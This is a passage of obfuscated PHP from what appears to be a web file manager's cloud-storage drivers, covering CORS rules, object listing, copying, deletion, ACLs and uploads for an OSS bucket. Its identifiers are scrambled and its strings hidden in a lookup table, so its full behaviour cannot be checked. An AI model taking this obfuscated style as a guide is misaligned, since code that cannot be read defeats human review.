$£½¦®š->getPath($™Ôİàê“); if (isset($ùÓÔü [$æã™ˆ Ì[1229]])) { $™Ôİàê“ = $ùÓÔü [$æã™ˆ Ì[1229]]; } $£½¦®š->path = $™Ôİàê“; return $£½¦®š; } public static function errorTips($Ù—‘Œ£¢ = false) { $À†íæÉ¥ =& $_SERVER[Š—Â“œÔ]; static $­İ•¢¹¿ = array(); $ğñ²û‘ = 1000; if ($Ù—‘Œ£¢ === -1) { return $­İ•¢¹¿ ? $­İ•¢¹¿[count($­İ•¢¹¿) - 1] : $À†íæÉ¥[12]; } if ($Ù—‘Œ£¢ === !1) { return implode($À†íæÉ¥[287], $­İ•¢¹¿); } if (count($­İ•¢¹¿) >= $ğñ²û‘) { $­İ•¢¹¿ = array_slice($­İ•¢¹¿, $ğñ²û‘ * 0.5, $ğñ²û‘); } $­İ•¢¹¿[] = $Ù—‘Œ£¢; write_log($À†íæÉ¥[176] . ACTION . $À†íæÉ¥[1260] . $Ù—‘Œ£¢, $À†íæÉ¥[1261]); } public static function getLastError($€¬Ÿ±øÒ = '') { $â‚ºşà¥ = self::errorTips(-1); return $â‚ºşà¥ ? $â‚ºşà¥ : $€¬Ÿ±øÒ; } } goto F¦ÔÓå¿««; B¢Š¯ä­ß: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ü¤ÀòÂ) { parent::__construct($Ü¤ÀòÂ); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } public function fileOutLink($ÑİŸÌÚÑ) { $çÃŞ¹”Î =& $_SERVER[Š—Â“œÔ]; if (substr($ÑİŸÌÚÑ, 0, 7) == $çÃŞ¹”Î[218]) { $ÑİŸÌÚÑ = $çÃŞ¹”Î[219] . substr($ÑİŸÌÚÑ, 7); } header($çÃŞ¹”Î[175] . $ÑİŸÌÚÑ); die; } public function uploadFormData($´ı©é””, $½ˆÏ€²û = 3600) { return $this->uploadFormDataV2($´ı©é””, $½ˆÏ€²û); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ÛÈ€«Êú) { parent::__construct(); include_once SDK_DIR . $_SERVER[Š—Â“œÔ][1461]; $this->_init($ÛÈ€«Êú); } public function _init($î˜Èãê) { $¼¥ °Ş’ =& $_SERVER[Š—Â“œÔ]; $this->config = $î˜Èãê; foreach ($î˜Èãê as $æ‡œõöü => $¹šÍ÷œ¢) { if (isset($this->{$æ‡œõöü})) { $this->{$æ‡œõöü} = $¹šÍ÷œ¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¼¥ °Ş’[1462] . LNG($¼¥ °Ş’[1463])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $«ïŠÄö¼ =& $_SERVER[Š—Â“œÔ]; $ÄÄçÛõ¥ = new OSS\Model\CorsConfig(); $¯äêşãÂ = new OSS\Model\CorsRule(); $¯äêşãÂ->addAllowedOrigin($«ïŠÄö¼[1464]); $¯äêşãÂ->addAllowedMethod($«ïŠÄö¼[1465]); $¯äêşãÂ->addAllowedMethod($«ïŠÄö¼[1466]); $¯äêşãÂ->addAllowedMethod($«ïŠÄö¼[1467]); $¯äêşãÂ->addAllowedMethod($«ïŠÄö¼[1468]); $¯äêşãÂ->addAllowedMethod($«ïŠÄö¼[165]); $¯äêşãÂ->setMaxAgeSeconds(600); $¯äêşãÂ->addExposeHeader($«ïŠÄö¼[1469]); $¯äêşãÂ->addAllowedHeader($«ïŠÄö¼[1464]); $ÄÄçÛõ¥->addRule($¯äêşãÂ); try { $this->client->putBucketCors($this->bucket, $ÄÄçÛõ¥); } catch (OSS\Core\OssException $Õíß‘¨â) { $this->writeLog(__FUNCTION__ . $«ïŠÄö¼[214] . $Õíß‘¨â->getMessage()); return !1; } return !0; } public function getBucketCors() { $é÷³ã¢æ =& $_SERVER[Š—Â“œÔ]; $ÆŞşÕ‰ = null; try { $ÆŞşÕ‰ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ğç’½) { $this->writeLog(__FUNCTION__ . $é÷³ã¢æ[214] . $ğç’½->getMessage()); return null; } if (!$ÆŞşÕ‰ || !($Á¯Ö´¡ = $ÆŞşÕ‰->getRules())) { return null; } $”œº€Ğ = $Á¯Ö´¡[0]->getAllowedOrigins(); $úãƒ©ª¹ = $Á¯Ö´¡[0]->getAllowedMethods(); $Æ–¸»è = $Á¯Ö´¡[0]->getMaxAgeSeconds(); $¥å´¦œÈ = $Á¯Ö´¡[0]->getExposeHeaders(); $Œ®¦Î£Ô = $Á¯Ö´¡[0]->getAllowedHeaders(); return array($é÷³ã¢æ[220] => isset($”œº€Ğ[0]) ? $”œº€Ğ[0] : $é÷³ã¢æ[12], $é÷³ã¢æ[224] => $úãƒ©ª¹, $é÷³ã¢æ[1470] => $Æ–¸»è, $é÷³ã¢æ[1471] => isset($¥å´¦œÈ[0]) ? $¥å´¦œÈ[0] : $é÷³ã¢æ[12], $é÷³ã¢æ[221] => isset($Œ®¦Î£Ô[0]) ? $Œ®¦Î£Ô[0] : $é÷³ã¢æ[12]); } public function isBucketCors() { $ÃÁÑ›ÁŞ =& $_SERVER[Š—Â“œÔ]; $ÁŸÒŞå¬ = $this->getBucketCors(); if (!$ÁŸÒŞå¬ || !is_array($ÁŸÒŞå¬)) { return !1; } if ($ÁŸÒŞå¬[$ÃÁÑ›ÁŞ[220]] != $ÃÁÑ›ÁŞ[222] || $ÁŸÒŞå¬[$ÃÁÑ›ÁŞ[221]] != $ÃÁÑ›ÁŞ[222]) { return !1; } $Ö¥Â§ÃÆ = array_map($ÃÁÑ›ÁŞ[223], $ÁŸÒŞå¬[$ÃÁÑ›ÁŞ[224]]); if (!is_array($Ö¥Â§ÃÆ)) { $Ö¥Â§ÃÆ = array(); } $úçá‡„º = array($ÃÁÑ›ÁŞ[225], $ÃÁÑ›ÁŞ[226], $ÃÁÑ›ÁŞ[227], $ÃÁÑ›ÁŞ[228], $ÃÁÑ›ÁŞ[229]); $½¡¶¬œ€ = array_diff($úçá‡„º, $Ö¥Â§ÃÆ); return empty($½¡¶¬œ€); } public function mkfile($È±û¯¦—, $ëï˜–¶³ = '', $àÖá•æ = REPEAT_RENAME) { $ş‡÷Ø¼ = $this->setContent($È±û¯¦—, $ëï˜–¶³); if ($ş‡÷Ø¼ !== !1) { return $this->getPathOuter($È±û¯¦—); } return !1; } public function mkdir($ËÕ—õÃ«, $ÚŒˆ‹ü› = REPEAT_SKIP) { if ($ÚŒˆ‹ü› && $this->_isFolder($ËÕ—õÃ«)) { return $this->getPathOuter($ËÕ—õÃ«); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ËÕ—õÃ«)); } catch (OSS\Core\OssException $ƒüäÛóœ) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $ƒüäÛóœ->getMessage()); return !1; } return $this->getPathOuter($ËÕ—õÃ«); } private function fileList($„®©šĞ, $ÙÚåüªœ = '', $å°ï²ÉÑ = 0) { $ºİŠè«› =& $_SERVER[Š—Â“œÔ]; $„®©šĞ = trim($„®©šĞ, $ºİŠè«›[8]); $®­ïòÒ¶ = empty($„®©šĞ) && $„®©šĞ !== $ºİŠè«›[230] ? $ºİŠè«›[12] : $„®©šĞ . $ºİŠè«›[8]; $èº½‹§œ = $ºİŠè«›[12]; $€É¾¶Óá = 1000; $æ¡“‡‘· = $å…”åÊø = array(); while (!0) { check_abort(); $ŞÏ›ìî™ = array($ºİŠè«›[1472] => $ÙÚåüªœ, $ºİŠè«›[1473] => $®­ïòÒ¶, $ºİŠè«›[1474] => $€É¾¶Óá, $ºİŠè«›[1475] => $èº½‹§œ); try { $®˜æîŞõ = $this->client->listObjects($this->bucket, $ŞÏ›ìî™); } catch (OSS\Core\OssException $•©éŸÚ™) { $this->writeLog(__FUNCTION__ . $ºİŠè«›[214] . $•©éŸÚ™->getMessage()); break; } $èº½‹§œ = $®˜æîŞõ->getNextMarker(); $–ã¿³Ê— = $®˜æîŞõ->getObjectList(); $ú¹‰øš’ = $®˜æîŞõ->getPrefixList(); foreach ($–ã¿³Ê— as $¡¥Ç­¬) { if ($¡¥Ç­¬->getKey() == $®­ïòÒ¶) { continue; } $ô³¶ñ» = $¡¥Ç­¬->getKey(); $˜íè¡³ğ = $¡¥Ç­¬->getSize(); $®†À•á = $¡¥Ç­¬->getLastModified(); $¨šâºŠã = trim($¡¥Ç­¬->getETag(), $ºİŠè«›[121]); $šæ¶„èĞ = $å°ï²ÉÑ ? array($ºİŠè«›[32] => $ô³¶ñ», $ºİŠè«›[79] => $˜íè¡³ğ, $ºİŠè«›[206] => strtotime($®†À•á), $ºİŠè«›[1476] => $¨šâºŠã) : $ô³¶ñ»; $¹°Êıû = $˜íè¡³ğ == 0 && substr($ô³¶ñ», strlen($ô³¶ñ») - 1, 1) == $ºİŠè«›[8] ? !0 : !1; $ØÊ–¼Á = array($ºİŠè«›[79] => $˜íè¡³ğ, $ºİŠè«›[1477] => $˜íè¡³ğ, $ºİŠè«›[88] => strtotime($®†À•á), $ºİŠè«›[1478] => $®†À•á, $ºİŠè«›[1476] => $¨šâºŠã); $this->cacheMethodInfoSet($ô³¶ñ», $¹°Êıû, $ØÊ–¼Á); if ($¹°Êıû) { $æ¡“‡‘·[] = $ô³¶ñ»; continue; } $å…”åÊø[] = $šæ¶„èĞ; } foreach ($ú¹‰øš’ as $°”®–Ø®) { $æ¡“‡‘·[] = $°”®–Ø®->getPrefix(); $this->cacheMethodInfoSet($°”®–Ø®->getPrefix(), !0); } if ($èº½‹§œ === $ºİŠè«›[12]) { break; } } $this->cacheMethodInfoSet($„®©šĞ, !0); return array($ºİŠè«›[85] => $æ¡“‡‘·, $ºİŠè«›[86] => $å…”åÊø); } public function listObject($¶ôöÂÈ, $ğ¨·Ñ˜Ê = '') { $Ñ²…Ã’¬ =& $_SERVER[Š—Â“œÔ]; $¶ôöÂÈ = trim($¶ôöÂÈ, $Ñ²…Ã’¬[8]); $¨µšãô¤ = empty($¶ôöÂÈ) && $¶ôöÂÈ !== $Ñ²…Ã’¬[230] ? $Ñ²…Ã’¬[12] : $¶ôöÂÈ . $Ñ²…Ã’¬[8]; $ÜÃ©Ü¦· = $Ñ²…Ã’¬[12]; $ë¦‰Ç×Ô = 1000; $Œù›½Áô = $ÀâÌ„³  = array(); while (!0) { check_abort(); $ÖÇˆ¹ = array($Ñ²…Ã’¬[1472] => $ğ¨·Ñ˜Ê, $Ñ²…Ã’¬[1473] => $¨µšãô¤, $Ñ²…Ã’¬[1474] => $ë¦‰Ç×Ô, $Ñ²…Ã’¬[1475] => $ÜÃ©Ü¦·); try { $¥„÷ÍÅÑ = $this->client->listObjects($this->bucket, $ÖÇˆ¹); } catch (OSS\Core\OssException $åóÈæ¬) { $this->writeLog(__FUNCTION__ . $Ñ²…Ã’¬[214] . $åóÈæ¬->getMessage()); break; } $ÜÃ©Ü¦· = $¥„÷ÍÅÑ->getNextMarker(); $ÀŒñÁãÔ = $¥„÷ÍÅÑ->getObjectList(); foreach ($ÀŒñÁãÔ as $×¼‹…Ò¯) { if ($×¼‹…Ò¯->getKey() == $¨µšãô¤) { continue; } $‰¹Öñ©Ö = $×¼‹…Ò¯->getKey(); $×¡’ô²È = $×¼‹…Ò¯->getSize(); $à¬“´ğŞ = $×¡’ô²È == 0 && substr($‰¹Öñ©Ö, strlen($‰¹Öñ©Ö) - 1, 1) == $Ñ²…Ã’¬[8] ? !0 : !1; if ($à¬“´ğŞ) { continue; } $ÀâÌ„³ [] = $×¡’ô²È . $Ñ²…Ã’¬[214] . $‰¹Öñ©Ö; } if ($ÜÃ©Ü¦· === $Ñ²…Ã’¬[12]) { break; } } return array($Ñ²…Ã’¬[85] => $Œù›½Áô, $Ñ²…Ã’¬[86] => $ÀâÌ„³ ); } public function copyFile($ïıêş¸¼, $÷Õ´âëÀ) { $û‚íªŒÅ = $this->size($ïıêş¸¼); if ($û‚íªŒÅ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ïıêş¸¼, $this->bucket, $this->pathEncode($÷Õ´âëÀ)); } catch (OSS\Core\OssException $ä°¡çúò) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $ä°¡çúò->getMessage()); return !1; } return $this->getPathOuter($÷Õ´âëÀ); } $šœò¿Î† = $this->multiCopyObject($ïıêş¸¼, $÷Õ´âëÀ, $û‚íªŒÅ); return $šœò¿Î† ? $this->getPathOuter($÷Õ´âëÀ) : !1; } private function multiCopyObject($íŞ ­, $à¬¢§ÙÁ, $õ¤Şåî) { $¯åÄ‰ =& $_SERVER[Š—Â“œÔ]; try { $°ÎŞ¤ê = array(); if ($éÍ«¦Õ† = $this->hashMd5($íŞ ­)) { $°ÎŞ¤ê = array(OSS\OssClient::OSS_HEADERS => array($¯åÄ‰[1479] => $éÍ«¦Õ†)); } $¬³¨éï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($à¬¢§ÙÁ), $°ÎŞ¤ê); $ñ®„À = 1; $Â§³¨Á  = 0; $ïê¡şåø = array(); $·¬“õªÔ = 1024 * 1024 * 10; $¬Çó¤ü = $this->client->generateMultiuploadParts($õ¤Şåî, $·¬“õªÔ); foreach ($¬Çó¤ü as $ŠûÅ‰• => $€×¿øà³) { $¹Ÿ±¨™Ì = $Â§³¨Á  + (int) $€×¿øà³[$¯åÄ‰[1480]]; $àÏóÔ¸ = (int) $€×¿øà³[$¯åÄ‰[414]] + $¹Ÿ±¨™Ì - 1; $Æ¾úš»Œ = array($¯åÄ‰[167] => $¹Ÿ±¨™Ì, $¯åÄ‰[168] => $àÏóÔ¸); $ïê¡şåø[] = $this->client->uploadPartCopy($this->bucket, $íŞ ­, $this->bucket, $this->pathEncode($à¬¢§ÙÁ), $ñ®„À, $¬³¨éï, $Æ¾úš»Œ); $ñ®„À = $ñ®„À + 1; } $“ƒŒ”¾¬ = array(); foreach ($ïê¡şåø as $ŠûÅ‰• => $àá»â’æ) { $“ƒŒ”¾¬[] = array($¯åÄ‰[299] => $ŠûÅ‰• + 1, $¯åÄ‰[300] => $àá»â’æ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($à¬¢§ÙÁ), $¬³¨éï, $“ƒŒ”¾¬); } catch (OSS\Core\OssException $¸˜§–¤ö) { $this->writeLog(__FUNCTION__ . $¯åÄ‰[214] . $¸˜§–¤ö->getMessage()); return !1; } return !0; } public function moveFile($ ÖêĞç¢, $‰´ƒÆ) { if ($this->copyFile($ ÖêĞç¢, $‰´ƒÆ)) { $this->remove($ ÖêĞç¢); return $this->getPathOuter($‰´ƒÆ); } return !1; } public function delFile($ÍšşÒ¿Ï) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÍšşÒ¿Ï)); } catch (OSS\Core\OssException $ß—±Øá) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $ß—±Øá->getMessage()); return !1; } return !0; } public function delFolder($„Î½¤µÀ) { $ô®ó¾ô =& $_SERVER[Š—Â“œÔ]; if (!$this->exist($„Î½¤µÀ)) { return !0; } $this->listItemCache = !1; $Šı‚ä™ş = $this->fileList($„Î½¤µÀ); $this->listItemCache = !0; $Õº‹Ïãˆ = trim($„Î½¤µÀ, $ô®ó¾ô[8]) . $ô®ó¾ô[8]; if (!empty($„Î½¤µÀ) && $„Î½¤µÀ !== $ô®ó¾ô[230] && !in_array($Õº‹Ïãˆ, $Šı‚ä™ş[$ô®ó¾ô[85]])) { $Šı‚ä™ş[$ô®ó¾ô[85]][] = $Õº‹Ïãˆ; } $×˜ü˜¢ = $this->delByBatch($Šı‚ä™ş[$ô®ó¾ô[86]]); if (!$×˜ü˜¢) { return !1; } $×˜ü˜¢ = $this->delByBatch($Šı‚ä™ş[$ô®ó¾ô[85]]); if (!$×˜ü˜¢) { return !1; } return $this->delFile($Õº‹Ïãˆ); } private function delByBatch($³¤¦á©) { foreach (array_chunk($³¤¦á©, 1000) as $¡ÇËÔçû) { try { $this->client->deleteObjects($this->bucket, $¡ÇËÔçû); } catch (OSS\Core\OssException $Î‰ìúÒ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $Î‰ìúÒ‹->getMessage()); return !1; } } return !0; } public function rename($†ÒÑø›Â, $­œùœ˜) { return $this->renameObject($†ÒÑø›Â, $­œùœ˜); } private function fileInfo($µÆ¢§û², $ŠªÁš˜û = false, $Ëåƒ¬ıÇ = array()) { $ô¡„‹ =& $_SERVER[Š—Â“œÔ]; $¬Òäıàö = array($ô¡„‹[32] => $this->pathThis($µÆ¢§û²), $ô¡„‹[87] => $this->getPathOuter($µÆ¢§û²), $ô¡„‹[33] => $ô¡„‹[232], $ô¡„‹[79] => isset($Ëåƒ¬ıÇ[$ô¡„‹[79]]) ? $Ëåƒ¬ıÇ[$ô¡„‹[79]] : 0, $ô¡„‹[169] => $this->ext($µÆ¢§û²)); if ($ŠªÁš˜û) { return $¬Òäıàö; } $¬Òäıàö[$ô¡„‹[233]] = $¬Òäıàö[$ô¡„‹[88]] = 0; $¬Òäıàö[$ô¡„‹[234]] = $¬Òäıàö[$ô¡„‹[235]] = !0; if (empty($Ëåƒ¬ıÇ)) { $ÒÉ›‰ş = $this->objectMeta($µÆ¢§û²); if (!$ÒÉ›‰ş) { return $¬Òäıàö; } $Ëåƒ¬ıÇ = array($ô¡„‹[88] => strtotime($ÒÉ›‰ş[$ô¡„‹[1478]]), $ô¡„‹[79] => $ÒÉ›‰ş[$ô¡„‹[1477]] + 0, $ô¡„‹[1476] => $ÒÉ›‰ş[$ô¡„‹[1476]]); } if (isset($Ëåƒ¬ıÇ[$ô¡„‹[1476]]) && $Ëåƒ¬ıÇ[$ô¡„‹[1476]]) { $¬Òäıàö[$ô¡„‹[237]] = trim($Ëåƒ¬ıÇ[$ô¡„‹[1476]], $ô¡„‹[121]); } if (isset($Ëåƒ¬ıÇ[$ô¡„‹[79]])) { $¬Òäıàö[$ô¡„‹[79]] = $Ëåƒ¬ıÇ[$ô¡„‹[79]]; } if (isset($Ëåƒ¬ıÇ[$ô¡„‹[88]])) { $¬Òäıàö[$ô¡„‹[88]] = $Ëåƒ¬ıÇ[$ô¡„‹[88]]; } if (isset($Ëåƒ¬ıÇ[$ô¡„‹[206]]) && !trim($¬Òäıàö[$ô¡„‹[88]])) { $¬Òäıàö[$ô¡„‹[88]] = $Ëåƒ¬ıÇ[$ô¡„‹[206]]; } return $¬Òäıàö; } private function folderInfo($½¯Ôó€©, $ÇğŞ–»æ = false, $‰Ìñ¢ = array()) { $úã‘„ Å =& $_SERVER[Š—Â“œÔ]; $ÌÒõ„âÙ = array($úã‘„ Å[32] => $this->pathThis($½¯Ôó€©), $úã‘„ Å[87] => $this->getPathOuter($úã‘„ Å[8] . $½¯Ôó€©), $úã‘„ Å[33] => $úã‘„ Å[78]); if ($ÇğŞ–»æ) { return $ÌÒõ„âÙ; } $ÌÒõ„âÙ[$úã‘„ Å[233]] = $ÌÒõ„âÙ[$úã‘„ Å[88]] = 0; $ÌÒõ„âÙ[$úã‘„ Å[234]] = $ÌÒõ„âÙ[$úã‘„ Å[235]] = !0; if (empty($‰Ìñ¢)) { $½¯Ôó€© = rtrim($½¯Ôó€©, $úã‘„ Å[8]) . $úã‘„ Å[8]; $ÚÚèÔ°š = $this->objectMeta($½¯Ôó€©); if (!$ÚÚèÔ°š) { return $ÌÒõ„âÙ; } $‰Ìñ¢ = array($úã‘„ Å[233] => $ÚÚèÔ°š[$úã‘„ Å[577]][$úã‘„ Å[1481]], $úã‘„ Å[88] => strtotime($ÚÚèÔ°š[$úã‘„ Å[1478]])); } if (isset($‰Ìñ¢[$úã‘„ Å[88]])) { $ÌÒõ„âÙ[$úã‘„ Å[88]] = $‰Ìñ¢[$úã‘„ Å[88]]; } if (isset($‰Ìñ¢[$úã‘„ Å[233]])) { $ÌÒõ„âÙ[$úã‘„ Å[233]] = $‰Ìñ¢[$úã‘„ Å[233]]; } return $ÌÒõ„âÙ; } public function listPath($×–ƒÑ­ó, $°Úã°Ğ = false) { $—³¿ì£ =& $_SERVER[Š—Â“œÔ]; $ˆğª–™Ñ = $this->fileList($×–ƒÑ­ó, $—³¿ì£[8], !0); foreach ($ˆğª–™Ñ[$—³¿ì£[85]] as $—ìŞòä => $¼Ë³Ôá) { $ˆğª–™Ñ[$—³¿ì£[85]][$—ìŞòä] = $this->folderInfo($¼Ë³Ôá, $°Úã°Ğ, $¼Ë³Ôá); } foreach ($ˆğª–™Ñ[$—³¿ì£[86]] as $—ìŞòä => $¼Ë³Ôá) { $ˆğª–™Ñ[$—³¿ì£[86]][$—ìŞòä] = $this->fileInfo($¼Ë³Ôá[$—³¿ì£[32]], $°Úã°Ğ, $¼Ë³Ôá); } return $ˆğª–™Ñ; } protected function infoChildren($Üœ«æÇä, &$ı¥È€ù) { $šÍ€¿£§ =& $_SERVER[Š—Â“œÔ]; $Ÿ‚ïàŒæ = $this->fileList($Üœ«æÇä, $šÍ€¿£§[12], !0); $ı¥È€ù[$šÍ€¿£§[81]] += count($Ÿ‚ïàŒæ[$šÍ€¿£§[85]]); $ı¥È€ù[$šÍ€¿£§[80]] += count($Ÿ‚ïàŒæ[$šÍ€¿£§[86]]); foreach ($Ÿ‚ïàŒæ[$šÍ€¿£§[86]] as $ŸË¥íÉ) { if (!$ŸË¥íÉ || !$ŸË¥íÉ[$šÍ€¿£§[79]]) { continue; } $ı¥È€ù[$šÍ€¿£§[79]] += $ŸË¥íÉ[$šÍ€¿£§[79]]; } } public function has($·›ØÅ , $¾¼çŒ’¼ = false, $è¡Ù‰Å = true) { $¥Ö…ƒëÑ =& $_SERVER[Š—Â“œÔ]; $·›ØÅ  = trim($·›ØÅ , $¥Ö…ƒëÑ[8]); $ã½ì¢°³ = empty($·›ØÅ ) && $·›ØÅ  !== $¥Ö…ƒëÑ[230] ? $¥Ö…ƒëÑ[12] : $·›ØÅ  . $¥Ö…ƒëÑ[8]; $İ°½É¬³ = $¥Ö…ƒëÑ[12]; $¹«ÒáÁ = 500; $­…‰êÎª = $Ş¡ï»¨÷ = 0; while (!0) { check_abort(); $Ö¼¿—Œè = array($¥Ö…ƒëÑ[1472] => $¥Ö…ƒëÑ[8], $¥Ö…ƒëÑ[1473] => $ã½ì¢°³, $¥Ö…ƒëÑ[1474] => $¹«ÒáÁ, $¥Ö…ƒëÑ[1475] => $İ°½É¬³); try { $§¯ö³ = $this->client->listObjects($this->bucket, $Ö¼¿—Œè); } catch (OSS\Core\OssException $Î”¤ÂÊÏ) { $this->writeLog(__FUNCTION__ . $¥Ö…ƒëÑ[214] . $Î”¤ÂÊÏ->getMessage()); break; } $İ°½É¬³ = $§¯ö³->getNextMarker(); $¤¹è¶¸ª = $§¯ö³->getObjectList(); $Â‡ëßˆ¯ = $§¯ö³->getPrefixList(); if ($¾¼çŒ’¼) { if (count($¤¹è¶¸ª) > 1 || count($¤¹è¶¸ª) == 1 && $¤¹è¶¸ª[0]->getKey() != $ã½ì¢°³) { $­…‰êÎª += count($¤¹è¶¸ª) - 1; } if (!empty($Â‡ëßˆ¯)) { $Ş¡ï»¨÷ += count($Â‡ëßˆ¯); } if ($İ°½É¬³ === $¥Ö…ƒëÑ[12]) { break; } continue; } if ($è¡Ù‰Å) { if (!empty($¤¹è¶¸ª)) { if (count($¤¹è¶¸ª) > 1 || $¤¹è¶¸ª[0]->getKey() != $ã½ì¢°³) { return !0; } } } else { if (!empty($Â‡ëßˆ¯)) { return !0; } } if ($İ°½É¬³ === $¥Ö…ƒëÑ[12]) { break; } } if ($¾¼çŒ’¼) { return array($¥Ö…ƒëÑ[241] => $­…‰êÎª, $¥Ö…ƒëÑ[242] => $Ş¡ï»¨÷); } return !1; } public function listAll($¦šµËÉ) { $Ù´ôÙ€ =& $_SERVER[Š—Â“œÔ]; $•Õü‡¤ = $this->fileList($¦šµËÉ, $Ù´ôÙ€[12], !0); $æâªÎµÙ = array_to_keyvalue($•Õü‡¤[$Ù´ôÙ€[86]], $Ù´ôÙ€[32]); foreach ($•Õü‡¤[$Ù´ôÙ€[85]] as $â–¼Ö») { if (is_string($â–¼Ö»)) { $æâªÎµÙ[$â–¼Ö»] = array($Ù´ôÙ€[79] => 0); } } return $this->listAllFiles($¦šµËÉ, $æâªÎµÙ); } public function canRead($„­Şô¯) { $á“•Ö÷Ï =& $_SERVER[Š—Â“œÔ]; $ÃÕôíøä = $this->pathAcl($„­Şô¯); return $ÃÕôíøä == $á“•Ö÷Ï[1482] || $ÃÕôíøä == $á“•Ö÷Ï[624] ? !0 : !1; } public function canWrite($õúô×ñ) { $µ´äøÆ× = $this->pathAcl($õúô×ñ); return $µ´äøÆ× == $_SERVER[Š—Â“œÔ][624] ? !0 : !1; } public function pathAcl($£‰ø€Í) { $£òËº€ =& $_SERVER[Š—Â“œÔ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¾ÍŸ³Îš = $this->client->getObjectAcl($this->bucket, $this->pathEncode($£‰ø€Í)); } catch (OSS\Core\OssException $ÅÖ¹™ˆÛ) { $this->writeLog(__FUNCTION__ . $£òËº€[214] . $ÅÖ¹™ˆÛ->getMessage()); return !1; } $şèé‘öÍ = $¾ÍŸ³Îš == $£òËº€[37] ? $this->bucketAcl : $¾ÍŸ³Îš; if ($şèé‘öÍ == $£òËº€[1483]) { return $£òËº€[1482]; } if ($şèé‘öÍ == $£òËº€[1484]) { return $£òËº€[624]; } return $şèé‘öÍ; } private function chmodPath($æá Â§†, $ãµÌ‚Î = '') { $ŞîÙÎ×í =& $_SERVER[Š—Â“œÔ]; $ÉáÒ¢¶Í = empty($ãµÌ‚Î) ? $ŞîÙÎ×í[1484] : $ãµÌ‚Î; $âîêŞ² = array($ŞîÙÎ×í[37], $ŞîÙÎ×í[231], $ŞîÙÎ×í[1483], $ŞîÙÎ×í[1484]); if (!in_array($ÉáÒ¢¶Í, $âîêŞ²)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($æá Â§†), $ÉáÒ¢¶Í); } catch (OSS\Core\OssException $Ö¤»‡î³) { $this->writeLog(__FUNCTION__ . $ŞîÙÎ×í[214] . $Ö¤»‡î³->getMessage()); return !1; } return !0; } public function getContent($¨–€ºí) { return $this->fileSubstr($¨–€ºí, -1); } public function setContent($Ìƒ€‚Èš, $øÍÆÃ–› = '') { $Ä¦şèè¸ =& $_SERVER[Š—Â“œÔ]; try { $ºÂëĞç¬ = $this->trafficLimit($Ä¦şèè¸[1485]); $Õèßñåı = $this->client->putObject($this->bucket, $this->pathEncode($Ìƒ€‚Èš), $øÍÆÃ–›, $ºÂëĞç¬); } catch (OSS\Core\OssException $ş´ƒÎšÃ) { $this->writeLog(__FUNCTION__ . $Ä¦şèè¸[214] . $ş´ƒÎšÃ->getMessage()); return !1; } $ÚÚçÛòª = array($Ä¦şèè¸[1479] => trim($Õèßñåı[$Ä¦şèè¸[1476]], $Ä¦şèè¸[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ìƒ€‚Èš))); $this->updateObjMeta($Ìƒ€‚Èš, $ÚÚçÛòª); return isset($Õèßñåı[$Ä¦şèè¸[1486]][$Ä¦şèè¸[296]]) ? !0 : !1; } private function updateObjMeta($È¥ü’, $·Á¢­³Ş) { $È¥ü’ = $this->pathEncode($È¥ü’); try { $ç×±‰ = array(OSS\OssClient::OSS_HEADERS => $·Á¢­³Ş); $this->client->copyObject($this->bucket, $È¥ü’, $this->bucket, $È¥ü’, $ç×±‰); } catch (OSS\Core\OssException $•Úòú”Ò) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $•Úòú”Ò->getMessage()); return !1; } return !0; } public function upload($Ëô¦¦˜, $òÕ»Ö, $ÜŠèá©‘ = false, $©ŞÇ¸ÚÕ = REPEAT_REPLACE) { $É–ß÷í» =& $_SERVER[Š—Â“œÔ]; $ñŒÕÖïí = trim($Ëô¦¦˜, $É–ß÷í»[8]); $ÅÏÁÕğ« = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($É–ß÷í»[1479] => @md5_file($òÕ»Ö)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ëô¦¦˜))); $ÅÏÁÕğ« = $this->trafficLimit($É–ß÷í»[1485], $ÅÏÁÕğ«); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ñŒÕÖïí), $òÕ»Ö, $ÅÏÁÕğ«); } catch (OSS\Core\OssException $Àªú¾ôÑ) { $this->writeLog(__FUNCTION__ . $É–ß÷í»[214] . $Àªú¾ôÑ->getMessage()); return !1; } return $this->getPathOuter($Ëô¦¦˜); } public function getHost() { $“‡¯«Ì„ =& $_SERVER[Š—Â“œÔ]; $…™ŸÅœÔ = explode($“‡¯«Ì„[210], parent::getHost()); return $…™ŸÅœÔ[0] . $“‡¯«Ì„[210] . $this->bucket . $“‡¯«Ì„[10] . $…™ŸÅœÔ[1]; } public function uploadFormData($ú‹¦êîß, $®¾†İÊ = 3600) { $ô±éİ²Ã =& $_SERVER[Š—Â“œÔ]; if (!($¬‹ µªö = $this->getHost())) { return !1; } $ªöñ”Çš = $®¾†İÊ; $Ó¥©²…Ê = date($ô±éİ²Ã[1487], time() + $ªöñ”Çš); $Ü˜ª£Á» = new 